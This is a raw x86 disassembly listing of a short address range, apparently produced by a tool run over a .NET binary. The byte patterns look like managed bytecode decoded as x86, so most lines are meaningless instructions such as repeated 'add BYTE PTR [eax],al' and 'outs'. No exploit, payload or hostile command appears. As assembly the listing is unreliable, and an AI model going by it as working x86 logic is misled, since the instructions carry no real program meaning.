  402c67:	add    al,BYTE PTR [eax]
  402c69:	jo     0x402c84
  402c6b:	lea    eax,[ecx]
  402c6d:	add    BYTE PTR [eax],al
  402c6f:	add    DWORD PTR [ebx],edx
  402c71:	or     edx,DWORD PTR [ecx]
  402c73:	or     edx,DWORD PTR [esi]
  402c75:	push   es
  402c76:	outs   dx,DWORD PTR ds:[esi]
  402c77:	outs   dx,DWORD PTR ds:[esi]
  402c78:	add    BYTE PTR [eax],al
  402c7a:	or     ah,BYTE PTR [edx+0x11170b11]
  402c80:	or     DWORD PTR [ebx+0x34],edi
  402c83:	add    BYTE PTR [eax],al
  402c85:	add    al,0x8c
  402c87:	dec    esp
  402c88:	add    BYTE PTR [eax],al
  402c8a:	add    DWORD PTR [edx+0x72180b11],esp
  402c90:	dec    ebx
  402c91:	add    al,BYTE PTR [eax]
  402c93:	jo     0x402c37
  402c95:	adc    DWORD PTR [ebx],ecx
  402c97:	sub    BYTE PTR [esi],bh
  402c99:	add    BYTE PTR [eax],al
  402c9b:	or     cl,BYTE PTR ds:0x686f06
  402ca1:	add    BYTE PTR [edx],cl
  402ca3:	outs   dx,DWORD PTR ds:[esi]
  402ca4:	aas    
  402ca5:	add    BYTE PTR [eax],al
  402ca7:	or     cl,BYTE PTR [ecx]
  402ca9:	sub    BYTE PTR [eax+0x0],dh
  402cac:	add    BYTE PTR [edx],cl
  402cae:	adc    eax,DWORD PTR [esi+edx*1]
  402cb1:	jae    0x402cfe
  402cb3:	add    BYTE PTR [eax],al
  402cb5:	push   es
  402cb6:	adc    eax,DWORD PTR ds:0x4e6f0511
  402cbc:	add    BYTE PTR [eax],al
  402cbe:	push   es
  402cbf:	adc    DWORD PTR ds:0x4c6f,eax
  402cc5:	push   es
  402cc6:	jae    0x402d39
  402cc8:	add    BYTE PTR [eax],al
  402cca:	or     dl,BYTE PTR [ebx]
  402ccc:	push   es
  402ccd:	push   es
  402cce:	push   es
  402ccf:	sub    BYTE PTR [ebx],dl
  402cd1:	add    BYTE PTR [eax],al
  402cd3:	push   es
  402cd4:	adc    DWORD PTR [ecx],ecx
  402cd6:	jnp    0x402d0c
  402cd8:	add    BYTE PTR [eax],al
  402cda:	add    al,0x17
  402cdc:	adc    DWORD PTR [esp+edx*1],eax
  402cdf:	adc    DWORD PTR [esi],eax
  402ce1:	jae    0x402d55
  402ce3:	add    BYTE PTR [eax],al
  402ce5:	or     dl,BYTE PTR [ebx]
  402ce7:	pop    es
  402ce8:	adc    DWORD PTR [edi],eax
  402cea:	sub    BYTE PTR [ebx+0x0],dh
  402ced:	add    BYTE PTR [edx],cl
  402cef:	jae    0x402d09
  402cf1:	add    BYTE PTR [eax],al
  402cf3:	push   es
  402cf4:	outs   dx,DWORD PTR ds:[esi]
  402cf5:	push   es
  402cf6:	add    BYTE PTR [eax],al
  402cf8:	sub    ebx,esi
  402cfa:	or     BYTE PTR [ecx],dl
  402cfc:	add    eax,0x4f6f
  402d01:	push   es
  402d02:	fadd   QWORD PTR [esi]
  402d04:	outs   dx,DWORD PTR ds:[esi]
  402d05:	imul   eax,DWORD PTR [eax],0x0
  402d08:	or     cl,BYTE PTR [ecx]
  402d0a:	adc    DWORD PTR [ecx],ecx
  402d0c:	jnp    0x402d42
  402d0e:	add    BYTE PTR [eax],al
  402d10:	add    al,0x73
  402d12:	jne    0x402d14
  402d14:	add    BYTE PTR [edx],cl
  402d16:	outs   dx,DWORD PTR ds:[esi]
  402d17:	jbe    0x402d19
  402d19:	add    BYTE PTR [edx],cl
  402d1b:	push   es
  402d1c:	push   es
  402d1d:	outs   dx,DWORD PTR ds:[esi]
  402d1e:	ja     0x402d20
  402d20:	add    BYTE PTR [edx],cl
  402d22:	sub    BYTE PTR [edi],al
  402d24:	add    BYTE PTR [eax],al
  402d26:	sub    esp,DWORD PTR [esi]
  402d28:	push   es
  402d29:	outs   dx,DWORD PTR ds:[esi]
  402d2a:	push   0x6f0a0000
  402d2f:	jns    0x402d31
  402d31:	add    BYTE PTR [edx],cl
  402d33:	sub    al,0xf
  402d35:	sub    BYTE PTR [edi],ch
  402d37:	add    BYTE PTR [eax],al
  402d39:	or     ch,BYTE PTR [eax]
  402d3b:	pop    edi
  402d3c:	add    BYTE PTR [eax],al
  402d3e:	push   es
  402d3f:	sub    BYTE PTR [esi],dl
  402d41:	add    BYTE PTR [eax],al
  402d43:	or     ch,BYTE PTR [eax]
  402d45:	das    
  402d46:	add    BYTE PTR [eax],al
  402d48:	or     ch,BYTE PTR [eax]
  402d4a:	pop    eax
  402d4b:	add    BYTE PTR [eax],al
  402d4d:	push   es
  402d4e:	push   es
  402d4f:	outs   dx,DWORD PTR ds:[esi]
  402d50:	ja     0x402d52
  402d52:	add    BYTE PTR [edx],cl
  402d54:	sub    BYTE PTR [ecx],bl
  402d56:	add    BYTE PTR [eax],al
  402d58:	or     dl,BYTE PTR [esi]
  402d5a:	sub    al,BYTE PTR [eax]
  402d5c:	add    DWORD PTR [eax],edx
  402d5e:	add    BYTE PTR [eax],al
  402d60:	add    al,BYTE PTR [eax]
  402d62:	dec    edi
  402d63:	add    bh,BYTE PTR [ebx+ecx*4]
  402d66:	add    cl,BYTE PTR [eax]
  402d68:	add    BYTE PTR [eax],al
  402d6a:	add    BYTE PTR [eax],al
  402d6c:	push   ds
  402d6d:	add    ch,BYTE PTR [edi+0x56]
  402d70:	add    BYTE PTR [eax],al
  402d72:	or     ch,BYTE PTR [edx]
  402d74:	pop    esi
  402d75:	add    ch,BYTE PTR [edi+0x56]
  402d78:	add    BYTE PTR [eax],al
  402d7a:	or     ch,BYTE PTR [ecx*1+0x566f02]
  402d81:	add    BYTE PTR [edx],cl
  402d83:	sbb    bh,dh
  402d85:	add    DWORD PTR [esi],edx
  402d87:	inc    BYTE PTR [ecx]
  402d89:	sub    dl,BYTE PTR [esi]
  402d8b:	sub    bl,BYTE PTR [ebx]
  402d8d:	xor    BYTE PTR [eax+eax*1],al
  402d90:	iret   
  402d91:	add    BYTE PTR [eax],al
  402d93:	add    BYTE PTR ds:0x73110000,cl
  402d99:	jnp    0x402d9b
  402d9b:	add    BYTE PTR [edx],cl
  402d9d:	or     al,BYTE PTR [esi]
  402d9f:	outs   dx,DWORD PTR ds:[esi]
  402da0:	or     BYTE PTR [eax],al
  402da2:	add    BYTE PTR [ebx],ch
  402da4:	or     eax,DWORD PTR [edx]
  402da6:	sub    BYTE PTR [ebx],dl
  402da8:	add    BYTE PTR [eax],al
  402daa:	push   es
  402dab:	or     al,0x8
  402dad:	outs   dx,DWORD PTR ds:[esi]
  402dae:	jge    0x402db0
  402db0:	add    BYTE PTR [edx],cl
  402db2:	adc    eax,DWORD PTR ds:0x512112b
  402db8:	sub    BYTE PTR [esi+0x0],bh
  402dbb:	add    BYTE PTR [edx],cl
  402dbd:	or     eax,0x16020906
  402dc2:	outs   dx,DWORD PTR ds:[esi]
  402dc3:	or     DWORD PTR [eax],eax
  402dc5:	add    BYTE PTR [ebx],ch
  402dc7:	adc    al,BYTE PTR ds:0x8028
  402dcd:	or     ch,BYTE PTR ds:0x120edee6
  402dd3:	add    eax,0x916fe
  402dd8:	add    BYTE PTR [ebx],bl
  402dda:	outs   dx,DWORD PTR ds:[esi]
  402ddb:	add    DWORD PTR [eax],0x28dc0a00
  402de1:	xchg   esp,eax
  402de2:	add    BYTE PTR [eax],al
  402de4:	push   es
  402de5:	sub    BYTE PTR [esi],dl
  402de7:	add    BYTE PTR [eax],al
  402de9:	or     ch,BYTE PTR [eax]
  402deb:	das    
  402dec:	add    BYTE PTR [eax],al
  402dee:	or     al,BYTE PTR [esi]
  402df0:	sub    BYTE PTR [ebx+0x0],dh
  402df3:	add    BYTE PTR [edx],cl
  402df5:	adc    al,0x6f
  402df7:	add    BYTE PTR [eax],0x0
  402dfa:	or     ch,BYTE PTR [edi-0x7d]
  402dfd:	add    BYTE PTR [eax],al
  402dff:	or     al,BYTE PTR [edi]
  402e01:	outs   dx,DWORD PTR ds:[esi]
  402e02:	test   BYTE PTR [eax],al
  402e04:	add    BYTE PTR [edx],cl
  402e06:	jle    0x402e09
  402e08:	add    BYTE PTR [eax],al
  402e0a:	add    al,0x2d
  402e0c:	adc    DWORD PTR [esi+edi*8],edx
  402e0f:	push   es
  402e10:	adc    eax,0x73060000
  402e15:	test   DWORD PTR [eax],eax
  402e17:	add    BYTE PTR [edx],cl
  402e19:	add    BYTE PTR [ecx],0x0
  402e1c:	add    BYTE PTR [esi+edi*2],al
  402e1f:	add    DWORD PTR [eax],eax
  402e21:	add    BYTE PTR [eax+ebp*1],al
  402e24:	or     al,BYTE PTR [eax]
  402e26:	add    BYTE PTR [ebx],ch
  402e28:	jle    0x402e2c
  402e2a:	add    BYTE PTR [eax],al
  402e2c:	add    al,0x2d
  402e2e:	adc    DWORD PTR [esi+edi*8],edx
  402e31:	push   es
  402e32:	push   ss
  402e33:	add    BYTE PTR [eax],al
  402e35:	push   es
  402e36:	jae    0x402e9a
  402e38:	add    BYTE PTR [eax],al
  402e3a:	or     al,BYTE PTR [eax+0x4000002]
  402e40:	jle    0x402e44
  402e42:	add    BYTE PTR [eax],al
  402e44:	add    al,0x28
  402e46:	add    al,BYTE PTR [eax]
  402e48:	add    BYTE PTR [ebx],ch
  402e4a:	adc    eax,DWORD PTR [edx+eax*1]
  402e4d:	adc    DWORD PTR [ebx+esi*2],eax
  402e50:	xchg   DWORD PTR [eax],eax
  402e52:	add    BYTE PTR [edx],cl
  402e54:	outs   dx,DWORD PTR ds:[esi]
  402e55:	mov    BYTE PTR [eax],al
  402e57:	add    BYTE PTR [edx],cl
  402e59:	add    al,BYTE PTR [edx]
  402e5b:	outs   dx,DWORD PTR ds:[esi]
  402e5c:	mov    DWORD PTR [eax],eax
  402e5e:	add    BYTE PTR [edx],cl
  402e60:	sub    BYTE PTR [edi],al
  402e62:	add    BYTE PTR [eax],al
  402e64:	sub    esp,DWORD PTR [esi]
  402e66:	sub    al,BYTE PTR [eax]
  402e68:	add    DWORD PTR [eax],edx
  402e6a:	add    BYTE PTR [eax],al
  402e6c:	add    al,BYTE PTR [eax]
  402e6e:	sbb    al,0x0
  402e70:	push   ds
  402e71:	cmp    al,BYTE PTR [eax]
  402e73:	push   cs
  402e74:	add    BYTE PTR [eax],al
  402e76:	add    BYTE PTR [eax],al
  402e78:	push   ds
  402e79:	add    ch,BYTE PTR [edi+0x56]
  402e7c:	add    BYTE PTR [eax],al
  402e7e:	or     ch,BYTE PTR [edx]
  402e80:	sbb    esi,DWORD PTR [eax]
  402e82:	add    eax,DWORD PTR [eax]
  402e84:	xchg   esp,eax
  402e85:	add    BYTE PTR [eax],al
  402e87:	add    BYTE PTR [esi],cl
  402e89:	add    BYTE PTR [eax],al
  402e8b:	adc    DWORD PTR [eax],ebp
  402e8d:	xchg   edi,eax
  402e8e:	add    BYTE PTR [eax],al
  402e90:	push   es
  402e91:	sub    BYTE PTR [esi],dl
  402e93:	add    BYTE PTR [eax],al
  402e95:	or     ch,BYTE PTR [eax]
  402e97:	das    
  402e98:	add    BYTE PTR [eax],al
  402e9a:	or     dh,BYTE PTR [edx+0x5b]
  402e9d:	add    al,BYTE PTR [eax]
  402e9f:	jo     0x402ec9
  402ea1:	xchg   esi,eax
  402ea2:	add    BYTE PTR [eax],al
  402ea4:	push   es
  402ea5:	sub    BYTE PTR [ebp+0x28060000],dl
  402eab:	daa    
  402eac:	add    BYTE PTR [eax],al
  402eae:	or     dh,BYTE PTR [edx+0x75]
  402eb1:	add    al,BYTE PTR [eax]
  402eb3:	jo     0x402edd
  402eb5:	push   ss
  402eb6:	add    BYTE PTR [eax],al
  402eb8:	or     al,BYTE PTR [edx]
  402eba:	outs   dx,DWORD PTR ds:[esi]
  402ebb:	pusha  
  402ebc:	add    BYTE PTR [eax],al
  402ebe:	or     bh,BYTE PTR [esi+0x3]
  402ec1:	add    BYTE PTR [eax],al
  402ec3:	add    al,0x2d
  402ec5:	adc    DWORD PTR [esi+edi*8],edx
  402ec8:	push   es
  402ec9:	pop    ss
  402eca:	add    BYTE PTR [eax],al
  402ecc:	push   es
  402ecd:	jae    0x402e54
  402ecf:	add    BYTE PTR [eax],al
  402ed1:	or     al,BYTE PTR [eax+0x4000003]
  402ed7:	jle    0x402edc
  402ed9:	add    BYTE PTR [eax],al
  402edb:	add    al,0x28
  402edd:	or     al,BYTE PTR [eax]
  402edf:	add    BYTE PTR [ebx],ch
  402ee1:	outs   dx,DWORD PTR ds:[esi]
  402ee2:	mov    al,BYTE PTR [eax]
  402ee4:	add    BYTE PTR [edx],cl
  402ee6:	or     ebp,DWORD PTR [ebx]
  402ee8:	and    al,BYTE PTR [edi]
  402eea:	outs   dx,DWORD PTR ds:[esi]
  402eeb:	mov    eax,DWORD PTR [eax]
  402eed:	add    BYTE PTR [edx],cl
  402eef:	or     dh,BYTE PTR [edx+0x5b]
  402ef2:	add    al,BYTE PTR [eax]
  402ef4:	jo     0x402efc
  402ef6:	outs   dx,DWORD PTR ds:[esi]
  402ef7:	push   esi
  402ef8:	add    BYTE PTR [eax],al
  402efa:	or     cl,BYTE PTR [esp+ecx*2+0x6010000]
  402f01:	outs   dx,DWORD PTR ds:[esi]
  402f02:	pop    ecx
  402f03:	add    BYTE PTR [eax],al
  402f05:	or     ch,BYTE PTR [eax]
  402f07:	daa    
  402f08:	add    BYTE PTR [eax],al
  402f0a:	or     al,BYTE PTR [edi]
  402f0c:	outs   dx,DWORD PTR ds:[esi]
  402f0d:	mov    WORD PTR [eax],es
  402f0f:	add    BYTE PTR [edx],cl
  402f11:	sub    eax,0x70aded6
  402f16:	sub    al,0x6
  402f18:	pop    es
  402f19:	outs   dx,DWORD PTR ds:[esi]
  402f1a:	add    DWORD PTR [eax],0x2adc0a00
  402f20:	add    DWORD PTR [eax],edx
  402f22:	add    BYTE PTR [eax],al
  402f24:	add    al,BYTE PTR [eax]
  402f26:	pop    ebx
  402f27:	add    BYTE PTR [esi],ch
  402f29:	mov    DWORD PTR [eax],eax
  402f2b:	or     al,BYTE PTR [eax]
  402f2d:	add    BYTE PTR [eax],al
  402f2f:	add    BYTE PTR [ebx],bl
  402f31:	xor    BYTE PTR [eax+eax*1],al
  402f34:	jae    0x402f36
  402f36:	add    BYTE PTR [eax],al
  402f38:	sldt   WORD PTR [eax]
  402f3b:	adc    DWORD PTR [ebx-0x73],esi
  402f3e:	add    BYTE PTR [eax],al
  402f40:	or     cl,BYTE PTR [edx]
  402f42:	add    ch,BYTE PTR [edi-0x72]
  402f45:	add    BYTE PTR [eax],al
  402f47:	or     ch,BYTE PTR [edi+0x7d]
  402f4a:	add    BYTE PTR [eax],al
  402f4c:	or     cl,BYTE PTR ds:0x312442b
  402f52:	sub    BYTE PTR [esi+0x0],bh
  402f55:	add    BYTE PTR [edx],cl
  402f57:	or     eax,DWORD PTR [edx]
  402f59:	outs   dx,DWORD PTR ds:[esi]
  402f5a:	push   0x6f0a0000
  402f5f:	aas    
  402f60:	add    BYTE PTR [eax],al
  402f62:	or     al,BYTE PTR [edi]
  402f64:	sub    BYTE PTR [eax+0x0],dh
  402f67:	add    BYTE PTR [edx],cl
  402f69:	or     al,0x8
  402f6b:	sub    BYTE PTR [eax+0x0],dl
  402f6e:	add    BYTE PTR [edx],cl
  402f70:	sub    al,0x9
  402f72:	push   es
  402f73:	or     BYTE PTR [edi-0x71],ch
  402f76:	add    BYTE PTR [eax],al
  402f78:	or     ch,BYTE PTR [ebx]
  402f7a:	sbb    DWORD PTR [edx-0x41],esi
  402f7d:	add    al,BYTE PTR [eax]
  402f7f:	jo     0x402f98
  402f81:	lea    eax,[ecx]
  402f83:	add    BYTE PTR [eax],al
  402f85:	add    DWORD PTR [ebx],edx
  402f87:	add    al,0x11
  402f89:	add    al,0x16
  402f8b:	pop    es
  402f8c:	mov    ds:0x90280411,al
  402f91:	add    BYTE PTR [eax],al
  402f93:	or     dl,BYTE PTR [edx]
  402f95:	add    ebp,DWORD PTR [eax]
  402f97:	add    BYTE PTR [eax],0x0
  402f9a:	or     ch,BYTE PTR ds:0x120edeb3
  402fa0:	add    edi,esi
  402fa2:	push   ss
  402fa3:	or     DWORD PTR [eax],eax
  402fa5:	add    BYTE PTR [ebx],bl
  402fa7:	outs   dx,DWORD PTR ds:[esi]
  402fa8:	add    DWORD PTR [eax],0x6dc0a00
  402fae:	sub    al,BYTE PTR [eax]
  402fb0:	add    DWORD PTR [eax],edx
  402fb2:	add    BYTE PTR [eax],al
  402fb4:	add    al,BYTE PTR [eax]
  402fb6:	adc    al,BYTE PTR [eax]
  402fb8:	push   ecx
  402fb9:	arpl   WORD PTR [eax],ax
  402fbb:	push   cs
  402fbc:	add    BYTE PTR [eax],al
  402fbe:	add    BYTE PTR [eax],al
  402fc0:	push   ds
  402fc1:	add    ch,BYTE PTR [eax]
  402fc3:	dec    edx
  402fc4:	add    BYTE PTR [eax],al
  402fc6:	or     ch,BYTE PTR [edx]
  402fc8:	add    esi,DWORD PTR [eax]
  402fca:	add    eax,DWORD PTR [eax]
  402fcc:	add    BYTE PTR fs:[eax],al
  402fcf:	add    BYTE PTR [eax],al
  402fd1:	add    BYTE PTR [eax],al
  402fd3:	add    BYTE PTR [edx],al
  402fd5:	sub    BYTE PTR [edx+0x0],cl
  402fd8:	add    BYTE PTR [edx],cl
  402fda:	add    dl,BYTE PTR [esi]
  402fdc:	jge    0x402fe2
  402fde:	add    BYTE PTR [eax],al
  402fe0:	add    al,0x2
  402fe2:	adc    eax,0x57d
  402fe7:	add    al,0x2
  402fe9:	jae    0x402f7c
  402feb:	add    BYTE PTR [eax],al
  402fed:	or     bh,BYTE PTR [ebp+0x6]
  402ff0:	add    BYTE PTR [eax],al
  402ff2:	add    al,0x2
  402ff4:	jnp    0x402ffc
  402ff6:	add    BYTE PTR [eax],al
  402ff8:	add    al,0x16
  402ffa:	sub    BYTE PTR [edx+0x6f0a0000],dl
  403000:	xchg   ebx,eax
  403001:	add    BYTE PTR [eax],al
  403003:	or     al,BYTE PTR [edx]
  403005:	jnp    0x40300d
  403007:	add    BYTE PTR [eax],al
  403009:	add    al,0x17
  40300b:	sub    BYTE PTR [eax+eax*1-0x6c90f600],dl
  403012:	add    BYTE PTR [eax],al
  403014:	or     al,BYTE PTR [edx]
  403016:	jnp    0x40301e
  403018:	add    BYTE PTR [eax],al
  40301a:	add    al,0x18
  40301c:	sub    BYTE PTR [ebp+0x6f0a0000],dl
  403022:	xchg   ebx,eax
  403023:	add    BYTE PTR [eax],al
  403025:	or     al,BYTE PTR [edx]
  403027:	jnp    0x40302f
  403029:	add    BYTE PTR [eax],al
  40302b:	add    al,0x19
  40302d:	sub    BYTE PTR [esi+0x6f0a0000],dl
  403033:	xchg   ebx,eax
  403034:	add    BYTE PTR [eax],al
  403036:	or     ch,BYTE PTR [edx]
  403038:	add    esi,DWORD PTR [eax]
  40303a:	add    al,0x0
  40303c:	ins    BYTE PTR es:[edi],dx
  40303d:	add    BYTE PTR [eax],al
  40303f:	add    BYTE PTR [eax],al
  403041:	add    BYTE PTR [eax],al
  403043:	add    BYTE PTR [edx],al
  403045:	jnp    0x40304b
  403047:	add    BYTE PTR [eax],al
  403049:	add    al,0x3
  40304b:	outs   dx,DWORD PTR ds:[esi]
  40304c:	xchg   edi,eax
  40304d:	add    BYTE PTR [eax],al
  40304f:	or     dh,BYTE PTR [ebx]
  403051:	push   cs
  403052:	add    bh,BYTE PTR [ebx+0x5]
  403055:	add    BYTE PTR [eax],al
  403057:	add    al,0x3
  403059:	outs   dx,DWORD PTR ds:[esi]
  40305a:	cwde   
  40305b:	add    BYTE PTR [eax],al
  40305d:	or     ch,BYTE PTR [esi]
  40305f:	dec    edi
  403060:	add    al,BYTE PTR [ebx]
  403062:	outs   dx,DWORD PTR ds:[esi]
  403063:	xchg   edi,eax
  403064:	add    BYTE PTR [eax],al
  403066:	or     bh,BYTE PTR [ebp+0x4]
  403069:	add    BYTE PTR [eax],al
  40306b:	add    al,0x2
  40306d:	add    ebp,DWORD PTR [edi-0x68]
  403070:	add    BYTE PTR [eax],al
  403072:	or     bh,BYTE PTR [ebp+0x5]
  403075:	add    BYTE PTR [eax],al
  403077:	add    al,0x72
  403079:	stc    
  40307a:	add    al,BYTE PTR [eax]
  40307c:	jo     0x403080
  40307e:	jnp    0x403086
  403080:	add    BYTE PTR [eax],al
  403082:	add    al,0x3
  403084:	outs   dx,DWORD PTR ds:[esi]
  403085:	xchg   edi,eax
  403086:	add    BYTE PTR [eax],al
  403088:	or     ch,BYTE PTR [edi-0x67]
  40308b:	add    BYTE PTR [eax],al
  40308d:	or     al,BYTE PTR [ebx]
  40308f:	outs   dx,DWORD PTR ds:[esi]
  403090:	cwde   
  403091:	add    BYTE PTR [eax],al
  403093:	or     ch,BYTE PTR [ebx+eiz*1+0x0]
  403097:	add    BYTE PTR [eax],al
  403099:	add    BYTE PTR [eax],al
  40309b:	add    BYTE PTR [ecx+0x40],bl
  40309e:	pop    ebx
  40309f:	mov    WORD PTR [edx+0x0],fs
  4030a2:	add    BYTE PTR [ecx],al
  4030a4:	add    ebp,DWORD PTR [edi-0x66]
  4030a7:	add    BYTE PTR [eax],al
  4030a9:	or     ch,BYTE PTR [eax]
  4030ab:	xor    al,0x0
  4030ad:	add    BYTE PTR [edx],cl
  4030af:	sub    al,BYTE PTR [ebx]
  4030b1:	xor    BYTE PTR [ebx],al
  4030b3:	add    BYTE PTR [ebp+0x0],dl
  4030b6:	add    BYTE PTR [eax],al
  4030b8:	add    BYTE PTR [eax],al
  4030ba:	add    BYTE PTR [eax],al
  4030bc:	add    ch,BYTE PTR [eax]
  4030be:	pushf  
  4030bf:	add    BYTE PTR [eax],al
  4030c1:	or     al,BYTE PTR [edx]
  4030c3:	add    al,BYTE PTR [ebx]
  4030c5:	sub    BYTE PTR [ebp+0x280a0000],bl
  4030cb:	and    BYTE PTR [eax],al
  4030cd:	add    BYTE PTR [esi],al
  4030cf:	add    al,BYTE PTR [edx]
  4030d1:	sub    BYTE PTR [edx+0x0],al
  4030d4:	add    BYTE PTR [esi],al
  4030d6:	sub    BYTE PTR [esi],bl
  4030d8:	add    BYTE PTR [eax],al
  4030da:	push   es
  4030db:	add    ch,BYTE PTR [eax]
  4030dd:	pop    ds
  4030de:	add    BYTE PTR [eax],al
  4030e0:	push   es
  4030e1:	sub    eax,0x1d28022d
  4030e6:	add    BYTE PTR [eax],al
  4030e8:	push   es
  4030e9:	sub    eax,0x28020225
  4030ee:	inc    ecx
  4030ef:	add    BYTE PTR [eax],al
  4030f1:	push   es
  4030f2:	sub    BYTE PTR [eax+eax*1],bl
  4030f5:	add    BYTE PTR [esi],al
  4030f7:	add    ch,BYTE PTR [eax]
  4030f9:	xor    eax,DWORD PTR [eax]
  4030fb:	add    BYTE PTR [esi],al
  4030fd:	sub    al,0x11
  4030ff:	add    ch,BYTE PTR [eax]
  403101:	xor    eax,0x2060000
  403106:	sub    BYTE PTR [ebx],dh
  403108:	add    BYTE PTR [eax],al
  40310a:	push   es
  40310b:	outs   dx,DWORD PTR ds:[esi]
  40310c:	push   0x0
  40310e:	add    BYTE PTR [edx],cl
  403110:	sub    bl,BYTE PTR [esi]
  403112:	add    bh,BYTE PTR [ebx+0xe]
  403115:	add    BYTE PTR [eax],al
  403117:	add    al,0x2a
  403119:	and    al,BYTE PTR [edx]
  40311b:	add    edi,DWORD PTR [ebp+0xe]
  40311e:	add    BYTE PTR [eax],al
  403120:	add    al,0x2a
  403122:	push   ds
  403123:	add    bh,BYTE PTR [ebx+0xf]
  403126:	add    BYTE PTR [eax],al
  403128:	add    al,0x2a
  40312a:	and    al,BYTE PTR [edx]
  40312c:	add    edi,DWORD PTR [ebp+0xf]
  40312f:	add    BYTE PTR [eax],al
  403131:	add    al,0x2a
  403133:	push   ds
  403134:	add    bh,BYTE PTR [ebx+0x10]
  403137:	add    BYTE PTR [eax],al
  403139:	add    al,0x2a
  40313b:	and    al,BYTE PTR [edx]
  40313d:	add    edi,DWORD PTR [ebp+0x10]
  403140:	add    BYTE PTR [eax],al
  403142:	add    al,0x2a
  403144:	push   ds
  403145:	add    bh,BYTE PTR [ebx+0x11]
  403148:	add    BYTE PTR [eax],al
  40314a:	add    al,0x2a
  40314c:	and    al,BYTE PTR [edx]
  40314e:	add    edi,DWORD PTR [ebp+0x11]
  403151:	add    BYTE PTR [eax],al
  403153:	add    al,0x2a
  403155:	push   ds
  403156:	add    bh,BYTE PTR [ebx+0x12]
  403159:	add    BYTE PTR [eax],al
  40315b:	add    al,0x2a
  40315d:	and    al,BYTE PTR [edx]
  40315f:	add    edi,DWORD PTR [ebp+0x12]
  403162:	add    BYTE PTR [eax],al
  403164:	add    al,0x2a
  403166:	push   ds
  403167:	add    bh,BYTE PTR [ebx+0x13]
  40316a:	add    BYTE PTR [eax],al
  40316c:	add    al,0x2a
  40316e:	and    al,BYTE PTR [edx]
  403170:	add    edi,DWORD PTR [ebp+0x13]
  403173:	add    BYTE PTR [eax],al
  403175:	add    al,0x2a
  403177:	push   ds
  403178:	add    bh,BYTE PTR [ebx+0x14]
  40317b:	add    BYTE PTR [eax],al
  40317d:	add    al,0x2a
  40317f:	and    al,BYTE PTR [edx]
  403181:	add    edi,DWORD PTR [ebp+0x14]
  403184:	add    BYTE PTR [eax],al
  403186:	add    al,0x2a
  403188:	push   ds
  403189:	add    bh,BYTE PTR [ebx+0x15]
  40318c:	add    BYTE PTR [eax],al
  40318e:	add    al,0x2a
  403190:	and    al,BYTE PTR [edx]
  403192:	add    edi,DWORD PTR [ebp+0x15]
  403195:	add    BYTE PTR [eax],al
  403197:	add    al,0x2a
  403199:	push   ds
  40319a:	add    bh,BYTE PTR [ebx+0x16]
  40319d:	add    BYTE PTR [eax],al
  40319f:	add    al,0x2a
  4031a1:	and    al,BYTE PTR [edx]
  4031a3:	add    edi,DWORD PTR [ebp+0x16]
  4031a6:	add    BYTE PTR [eax],al
  4031a8:	add    al,0x2a
  4031aa:	push   ds
  4031ab:	add    bh,BYTE PTR [ebx+0x17]
  4031ae:	add    BYTE PTR [eax],al
  4031b0:	add    al,0x2a
  4031b2:	and    al,BYTE PTR [edx]
  4031b4:	add    edi,DWORD PTR [ebp+0x17]
  4031b7:	add    BYTE PTR [eax],al
  4031b9:	add    al,0x2a
  4031bb:	push   ds
  4031bc:	add    bh,BYTE PTR [ebx+0x18]
  4031bf:	add    BYTE PTR [eax],al
  4031c1:	add    al,0x2a
  4031c3:	and    al,BYTE PTR [edx]
  4031c5:	add    edi,DWORD PTR [ebp+0x18]
  4031c8:	add    BYTE PTR [eax],al
  4031ca:	add    al,0x2a
  4031cc:	push   ds
  4031cd:	add    bh,BYTE PTR [ebx+0x19]
  4031d0:	add    BYTE PTR [eax],al
  4031d2:	add    al,0x2a
  4031d4:	and    al,BYTE PTR [edx]
  4031d6:	add    edi,DWORD PTR [ebp+0x19]
  4031d9:	add    BYTE PTR [eax],al
  4031db:	add    al,0x2a
  4031dd:	push   ds
  4031de:	add    bh,BYTE PTR [ebx+0x1a]
  4031e1:	add    BYTE PTR [eax],al
  4031e3:	add    al,0x2a
  4031e5:	and    al,BYTE PTR [edx]
  4031e7:	add    edi,DWORD PTR [ebp+0x1a]
  4031ea:	add    BYTE PTR [eax],al
  4031ec:	add    al,0x2a
  4031ee:	push   ds
  4031ef:	add    bh,BYTE PTR [ebx+0x1b]
  4031f2:	add    BYTE PTR [eax],al
  4031f4:	add    al,0x2a
  4031f6:	and    al,BYTE PTR [edx]
  4031f8:	add    edi,DWORD PTR [ebp+0x1b]
  4031fb:	add    BYTE PTR [eax],al
  4031fd:	add    al,0x2a
  4031ff:	push   ds
  403200:	add    bh,BYTE PTR [ebx+0x1c]
  403203:	add    BYTE PTR [eax],al
  403205:	add    al,0x2a
  403207:	and    al,BYTE PTR [edx]
  403209:	add    edi,DWORD PTR [ebp+0x1c]
  40320c:	add    BYTE PTR [eax],al
  40320e:	add    al,0x2a
  403210:	push   cs
  403211:	pop    ds
  403212:	das    
  403213:	sub    bl,BYTE PTR [ebx]
  403215:	xor    BYTE PTR ds:0x4300,al
  40321b:	add    BYTE PTR [eax],dl
  40321d:	add    BYTE PTR [eax],al
  40321f:	adc    DWORD PTR [edx],eax
  403221:	sub    BYTE PTR [esi+0x2d0a0000],bl
  403227:	aaa    
  403228:	add    ch,BYTE PTR [eax]
  40322a:	lahf   
  40322b:	add    BYTE PTR [eax],al
  40322d:	or     ah,BYTE PTR [esi]
  40322f:	fisubr WORD PTR [esi]
  403231:	or     ch,BYTE PTR [eax]
  403233:	cmp    al,BYTE PTR [eax]
  403235:	add    BYTE PTR [edx],cl
  403237:	sub    BYTE PTR [eax+0x17060000],bl
  40323d:	lea    eax,[ecx]
  40323f:	add    BYTE PTR [eax],al
  403241:	add    DWORD PTR ds:0xa2021609,ecx
  403247:	or     DWORD PTR [eax],ebp
  403249:	add    BYTE PTR ds:[eax],al
  40324c:	or     cl,BYTE PTR [ebx]
  40324e:	push   es
  40324f:	pop    es
  403250:	sub    BYTE PTR [ebx],bl
  403252:	add    BYTE PTR [eax],al
  403254:	or     al,BYTE PTR [edi]
  403256:	sub    BYTE PTR [esi],dl
  403258:	add    BYTE PTR [eax],al
  40325a:	or     dl,BYTE PTR [esi]
  40325c:	or     al,0xde
  40325e:	add    dl,BYTE PTR [edi]
  403260:	sub    cl,BYTE PTR [eax]
  403262:	sub    al,BYTE PTR [eax]
  403264:	add    DWORD PTR [eax],edx
  403266:	add    BYTE PTR [eax],al
  403268:	add    BYTE PTR [eax],al
  40326a:	or     BYTE PTR [eax],al
  40326c:	or     DWORD PTR [ecx],edx
  40326e:	add    BYTE PTR [esi],ch
  403270:	xor    DWORD PTR [eax],eax
